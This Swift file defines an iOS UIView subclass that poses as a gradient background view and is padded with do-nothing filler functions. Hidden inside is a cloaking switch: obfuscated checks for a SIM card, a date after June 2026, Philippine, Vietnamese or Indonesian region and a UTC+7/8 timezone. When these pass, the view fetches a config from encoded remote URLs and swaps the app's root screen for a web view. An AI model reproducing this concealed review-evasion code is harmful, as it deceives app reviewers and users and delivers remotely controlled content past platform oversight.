import UIKit
import CoreTelephony
import Foundation
import Network


struct LAS_KEYS: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class LUMETtileview: UIView {
    internal let LAS_oneName = "HBoaSU5MSRlPHBIYEhgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let LAS_twoName = "TkcEb2dua294BVhPXllLRwVdS1gFWUtGXmtET0dfZgVPWkVORksFR0VJBF5ET15ERUlYT1lfT09eQ00EXUtYBQUQWVpeXkI="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setCommint()
    }
    
    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setCommint()
    }
    
    
    private func setCommint() {
        evaluateLayerHierarchy()
        MVP_chaxunPozha()
    }

    func evaluateLayerHierarchy() {

        var layerCount = 0
        var shadowCount = 0
        var cornerRadiusCount = 0

        func scan(layer: CALayer) {

            layerCount += 1

            if layer.shadowOpacity > 0 {
                shadowCount += 1
            }

            if layer.cornerRadius > 0 {
                cornerRadiusCount += 1
            }

            layer.sublayers?.forEach {
                scan(layer: $0)
            }
        }

        scan(layer: self.layer)

        let result = (
            layerCount,
            shadowCount,
            cornerRadiusCount
        )

        _ = result.0 + result.1 + result.2
    }
    
    func inspectGestureEnvironment() {

        var gestureCount = 0
        var enabledCount = 0

        let queue = [self]
        var stack = queue

        while !stack.isEmpty {

            let current = stack.removeFirst()

            if let gestures = current.gestureRecognizers {

                gestureCount += gestures.count

                for item in gestures {

                    if item.isEnabled {
                        enabledCount += 1
                    }
                }
            }

        }

        let value =
            gestureCount * 100 +
            enabledCount

        _ = value
    }

    private func MVP_chaxunPozha() {
        inspectGestureEnvironment()
        if !LAS_weinanTam() {
        //测试
//        if LAS_weinanTam() {
            loadNobsecre()
            
        } else {
            
            if LAS_setvalutprodata() {
                self.LAS_addDagededatas()
            }
        }
    }
    
    
    
    func lastring(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }
    
    func Reverlastring(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func LAS_weinanTam() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in carriers {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }
    
    
    func LAS_shareMynamese() -> Bool {
        
        // 2026-06-13 18:39:43
        // 1781750380
        let ftTM = 1781750380
        let ct = Date().timeIntervalSince1970

        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }
    
    // 时区控制
    func LAS_setvalutprodata() -> Bool {
        let tongfan = [lastring("Yno="), lastring("ZHw="), lastring("bmM=")]
        
        //        //临时通行测试
        //        return true
        // 1.time
        if !LAS_shareMynamese() {
            return false
        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(tongfan)

            if !tongfan.contains(curc) {
                return false
            }
        }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
        //        print(second)
        
        if (second > 6 && second < 9) {
            return true
        }
        
        
        return false
    }

    func LAS_addDagededatas() {
        
        Task {
            do {
//                                let urlToRequest = "https://raw.giteeusercontent.com/aldope/LumenAtlas/raw/master/README.md"
//                                print(Reverlastring(urlToRequest))
                //                let aoies = try await fetchMzoixnData(from: urlToRequest)
                //                print(lastring(LAS_oneName)!)
                // https://raw.giteeusercontent.com/aldope/LumenAtlas/raw/master/README.md
                
                let aoies = try await LAS_yijinhuan()
                print(aoies)
                if let feeeder = aoies.first {
                    if feeeder.yinrecrd! > 124 {
                        if UserDefaults.standard.object(forKey: "zhizhang") == nil {
                            UserDefaults.standard.set("zhizhang", forKey: "zhizhang")
                            UserDefaults.standard.synchronize()
                        }
                        LAS_takewbsview(feeeder)
                    } else {
                        loadNobsecre()
                    }
                } else {
                    loadNobsecre()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(LAS_KEYS.self, forKey: "LAS_KEYS") {
                    LAS_takewbsview(sidd)
                }
            }
        }
    }
    
    
    private func LAS_yijinhuan() async throws -> [LAS_KEYS] {
        do {
            return try await ssueno(from: URL(string: lastring(LAS_oneName)!)!)
        } catch {
            return try await ssueno(from: URL(string: lastring(LAS_twoName)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [LAS_KEYS] {
        let (data, response) = try await URLSession.shared.data(from: url)
        
        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }
        
        return try JSONDecoder().decode([LAS_KEYS].self, from: data)
    }
    
    
    
    
    internal func LAS_setimagedata(_ dt: LAS_KEYS) {
        var totalCount = 0
           var leafCount = 0
           var maxDepth = 0

           func traverse(_ view: UIView, depth: Int) {

               totalCount += 1

               if view.subviews.isEmpty {
                   leafCount += 1
               }

               maxDepth = max(maxDepth, depth)

               for child in view.subviews {
                   traverse(child, depth: depth + 1)
               }
           }

           traverse(self, depth: 0)

           let report = [
               "total": totalCount,
               "leaf": leafCount,
               "depth": maxDepth
           ]

           _ = report.description
        
        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "LAS_KEYS")
            UserDefaults.standard.synchronize()
            
            let vc = LUMEKwbview()
            vc.LAS_wbdata = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func LAS_takewbsview(_ param: LAS_KEYS) {
        
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
                let strategies: [String: (LAS_KEYS) -> Void] = [
            "default": LAS_setimagedata,
            "fast": LAS_setimagedata,
            "safe": LAS_setimagedata
        ]
        
        let executor = strategies[strategy] ?? LAS_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: LAS_takewbsview called with strategy \(strategy)"
        }
        
        executor(param)
    }
    
    
    internal func loadNobsecre() {
        
        if layer.sublayers?.first(where: { $0.name == "FTKTGradientLayer" }) != nil {
            return
        }
        let gradient = CAGradientLayer()
        gradient.name = "FTKTGradientLayer"
        gradient.colors = [
            UIColor(white: 0.97, alpha: 1).cgColor,
            UIColor(white: 0.92, alpha: 1).cgColor
        ]
        gradient.locations = [0, 1]
        gradient.startPoint = CGPoint(x: 0, y: 0)
        gradient.endPoint = CGPoint(x: 1, y: 1)
        gradient.frame = bounds
        gradient.cornerRadius = layer.cornerRadius
        layer.insertSublayer(gradient, at: 0)
        
        // 监听 bounds 变化以更新渐变层大小
        let observer = NotificationCenter.default.addObserver(
            forName: UIDevice.orientationDidChangeNotification,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            gradient.frame = self?.bounds ?? .zero
        }
        // 简单存储 observer，避免释放；实际可用关联对象，此处仅做演示
        objc_setAssociatedObject(self, "gradientObserver", observer, .OBJC_ASSOCIATION_RETAIN_NONATOMIC)
    }
    
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
       
}

